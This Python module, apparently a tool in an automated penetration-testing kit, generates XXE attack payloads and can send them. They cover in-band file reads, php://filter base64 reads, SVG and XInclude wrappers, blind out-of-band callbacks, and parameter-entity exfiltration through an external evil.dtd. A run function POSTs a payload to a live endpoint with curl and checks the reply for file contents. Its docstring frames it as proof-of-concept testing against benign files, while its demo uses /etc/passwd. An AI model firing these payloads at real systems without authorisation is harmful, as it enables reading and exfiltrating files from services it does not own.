"""XXE primitive — mint the XML external-entity payloads to inject, and (optionally) fire one at an
XML-parsing endpoint and return the response. Same shape as jwt_forge: the hard part is getting the
payload variants right (classic in-band file read, parameter-entity OOB exfil, SVG/SOAP/XInclude
wrappers, php filter for base64), so this generates them ready to inject. Blind XXE is confirmed
out-of-band — pair with the `oob` tool (mint a callback URL, feed it here as oob_url, then check it).

Read-only by intent: file-read targets a benign file (/etc/hostname by default, NOT secrets) and OOB
just proves the parser reached out. Do not exfil credential files — prove the class, then report.
"""
import base64


def build(mode: str = "file", target: str = "/etc/hostname", oob_url: str = "") -> list:
    """Return [(label, payload)] for the requested mode: 'file' (in-band read), 'oob' (blind
    callback), 'exfil' (parameter-entity file exfil to oob), 'all'."""
    out = []
    f = target or "/etc/hostname"

    def classic():
        return (f'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file://{f}">]>\n'
                f'<r>&xxe;</r>')

    def php_b64():
        return (f'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM '
                f'"php://filter/convert.base64-encode/resource={f}">]>\n<r>&xxe;</r>')

    def svg():
        return (f'<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM '
                f'"file://{f}">]>\n<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')

    def oob_basic():
        return (f'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "{oob_url}">]>\n<r>&xxe;</r>')

    def oob_param_exfil():
        # parameter-entity exfil: read the file, send it out-of-band as a query param (needs an
        # external DTD the target fetches from oob_url/evil.dtd hosting the eval/exfil entities)
        return (f'<?xml version="1.0"?>\n<!DOCTYPE r [\n'
                f'  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={f}">\n'
                f'  <!ENTITY % dtd SYSTEM "{oob_url}/evil.dtd">\n  %dtd;\n]>\n<r>&send;</r>')

    def xinclude():
        return ('<r xmlns:xi="http://www.w3.org/2001/XInclude">'
                f'<xi:include parse="text" href="file://{f}"/></r>')

    if mode in ("file", "all"):
        out += [("classic-file-read", classic()), ("php-filter-base64", php_b64()),
                ("svg-file-read", svg()), ("xinclude (no DOCTYPE needed)", xinclude())]
    if mode in ("oob", "all") and oob_url:
        out.append(("blind-oob (confirm with the oob tool)", oob_basic()))
    if mode in ("exfil", "all") and oob_url:
        out.append(("param-entity-exfil (host evil.dtd on your collaborator)", oob_param_exfil()))
    if not out:
        out = [("classic-file-read", classic())]
    return out


def run(sb, args: dict) -> str:
    mode = (args.get("mode") or "file").lower()
    target = args.get("target") or "/etc/hostname"
    oob_url = args.get("oob_url") or ""
    payloads = build(mode, target, oob_url)
    endpoint = args.get("url") or ""
    if not endpoint:                                   # mint-only: hand back payloads to inject
        body = "\n\n".join(f"# {label}\n{p}" for label, p in payloads)
        tip = ("\n\n[xxe] no 'url' given — inject these into the XML sink (request body, file upload, "
               "SOAP/SAML). For blind, mint an oob URL first and pass it as oob_url, then check the "
               "oob token.")
        return "XXE PAYLOADS (" + mode + "):\n\n" + body + tip
    # fire the first in-band payload and return the response (in-band file read confirmation)
    label, payload = payloads[0]
    b64 = base64.b64encode(payload.encode()).decode()
    ct = args.get("content_type") or "application/xml"
    hdr = ""
    h = args.get("headers")
    if isinstance(h, str) and ":" in h:
        for line in h.replace("\\n", "\n").splitlines():
            if ":" in line:
                hdr += f" -H {line.strip()!r}"
    out = sb.bash(f"echo {b64} | base64 -d | curl -s -m 20 -X POST -H 'Content-Type: {ct}'{hdr} "
                  f"--data-binary @- {endpoint!r}", timeout=60)
    hit = any(sig in (out or "") for sig in ("root:", "/bin/", "127.0.0.1", "localhost")) or \
        (target == "/etc/hostname" and out and out.strip() and "<" not in out[:5])
    tag = "‼ likely FILE READ — response contains file-shaped content" if hit else \
        "no in-band read (may be blind — use oob_url + the oob tool, or try php-filter/base64)"
    return f"XXE [{label}] -> {endpoint}\n{tag}\nresponse (first 600):\n{(out or '')[:600]}"


def demo() -> None:
    p = dict(build("file", "/etc/passwd"))
    assert "classic-file-read" in p and "file:///etc/passwd" in p["classic-file-read"]
    assert "php://filter/convert.base64-encode/resource=/etc/passwd" in p["php-filter-base64"]
    assert "XInclude" in p["xinclude (no DOCTYPE needed)"] or "xinclude" in str(p).lower()
    # oob mode needs an oob_url; without one it falls back to at least a file payload
    assert build("oob", "/etc/hostname", "")[0][0] == "classic-file-read"
    ob = dict(build("oob", "/etc/hostname", "http://clb.oob/tok"))
    assert any("clb.oob" in v for v in ob.values())
    ex = dict(build("exfil", "/etc/passwd", "http://clb.oob/tok"))
    assert any("evil.dtd" in v and "%dtd;" in v for v in ex.values())
    allp = build("all", "/etc/hostname", "http://clb.oob/t")
    assert len(allp) >= 6
    print("xxe.py ok")


if __name__ == "__main__":
    demo()
